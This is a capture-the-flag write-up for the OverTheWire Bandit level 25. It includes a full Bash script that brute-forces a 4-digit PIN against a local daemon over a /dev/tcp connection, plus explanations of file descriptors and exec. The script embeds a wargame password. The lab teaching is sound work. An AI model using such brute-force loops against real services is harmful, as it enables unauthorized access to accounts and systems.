# Bandit Level 25

## Challenge

A daemon is listening on port `30002` and will give you the password for `bandit25` if given the password for `bandit24` and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time.

---

## Initial Thoughts

In this level, the challenge requires us to write a brute-force script to find the correct 4-digit pincode.

Since the challenge states that we do not need to create a new connection for each attempt, I can establish one TCP connection and continuously send pincodes through it.

---

## Solution

### Step 1: Try some pincodes manually

First, I used `nc` to open a TCP connection:

```bash
nc localhost 30002
```

Then, I tried some basic pincodes to examine its response:

```text
[bandit24_pass] 0000
Wrong! Please enter the correct current password and pincode. Try again.
[bandit24_pass] 0001
Wrong! Please enter the correct current password and pincode. Try again.
[bandit24_pass] 0002
Wrong! Please enter the correct current password and pincode. Try again.
...
```

The server read each answer I sent and returned a response. Since the response for an incorrect pincode is consistent, I could store that response and compare each subsequent response against it.

### Step 2: Write and use script

I created a temporary directory:

```bash
mkdir /tmp/Piggeright
```

Then I used `vim` to write script:

```bash
vim /tmp/Piggeright/bruteforce.sh
```

The script is:

```bash
#!/bin/bash

exec 3<>/dev/tcp/localhost/30002

pincode=0
bandit24pass='hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv'

printf "%s %04d\n" "$bandit24pass" "$pincode" >&3

read fail_response <&3
read fail_response <&3

for pincode in {1..9999}; do
      printf "%s %04d\n" "$bandit24pass" "$pincode" >&3

      if ! read response <&3; then
              echo "Connection closed"
              break
      fi

      if [[ "$response" != "$fail_response" ]]; then
              printf "%s\n" "$response"
              printf "%s %04d\n" "$bandit24pass" "$pincode"
      fi
done
```

The script creates a TCP connection to the server and associates it with file descriptor `3`:

```bash
exec 3<>/dev/tcp/localhost/30002
```
The `<>` opens the connection for both reading and writing. Therefore, I can use `>&3` to send data and `<&3` to receive data.

I first send the password with the pincode `0000`, then read the server's response and store the failure response in `fail_response`. Since the server sends another response before the intended failure message, I use two `read` commands to consume both responses and store the intended one in `fail_response`.

After that, the script loops through the remaining 9999 possible pincodes. For each pincode, it:

1. Sends the password and pincode to the server.
2. Reads the server's response.
3. Checks whether the connection has been closed.
4. Compares the response with the known failure response.
5. If the response is different, the script returns the password and pincode to Bash.

I saved the script and ran it:

```bash
bash /tmp/Piggerright/bruteforce.sh
```

Output:

```text
Correct!
[bandit24_pass] [correct_pincode]
...
```

Finally, I opened another TCP connection using `nc`:

```bash
nc localhost 30002
```

and submitted the correct pincode:

```text
[bandit24_pass] [correct_pincode]
```

The server returned:

```text
Correct!
The password of user bandit25 is [bandit25_pass]
```

## Key Takeaways

### File descriptor (FD)

A **file descriptor** is simply a number that a process uses to refer to an open input/output resource.

When Bash opens something:

```bash
cat file.txt
```

the operating system assigns the process a file descriptor for the opened resource.

```text
Bash
├── 0 → keyboard/input
├── 1 → terminal/output
├── 2 → terminal/error
└── 3 → file.txt
```

**Notes**: `0`,`1`, and `2` are standard FDs. Shell redirection can modify where these standard FDs point. The others are available for additional I/O resources and can be created, modified, or closed using `exec`.

### exec

`exec` is a Bash builtin with two main uses:

1. Replace the current Bash process with a command

```bash
exec ls
```

→ Bash becomes `ls`; when `ls` exits, that Bash shell does not return.

2. Modify file descriptors of the current Bash shell

```bash
exec [n]<>[file]
```

→ Open `[file]` for both reading and writing and associate it with file descriptor `[n]`.

Then:

```bash
printf "hello\n" >&[n]  # write to FD 3
read response <&[n]     # read from FD 3
```

### /dev/tcp/[IP_address/domain]/[port]

`/dev/tcp/[IP_address/domain]/[port]` is a Bash-specific feature that allows Bash to establish a TCP connection to the specified host and port.

It is commonly used with `exec`:

```bash
exec [n]<>/dev/tcp/[IP_address/domain]/[port]
```

This opens the TCP connection for both reading and writing and associates it with file descriptor `[n]`. We can then send and receive data through FD `[n]`.

This TCP connection is similar to what `nc` establishes: a plain TCP connection without an application-layer protocol being added automatically.

Using `/dev/tcp` with `exec` can be more convenient than `nc` in Bash scripts when you need to repeatedly send and receive data while continuing to execute shell commands.

However, we need to handle connection closure/EOF ourself.

```bash
if ! read response <&3; then
    echo "Connection closed"
    break
fi
```

## References

- [OverTheWire Bandit](https://overthewire.org/wargames/bandit/)
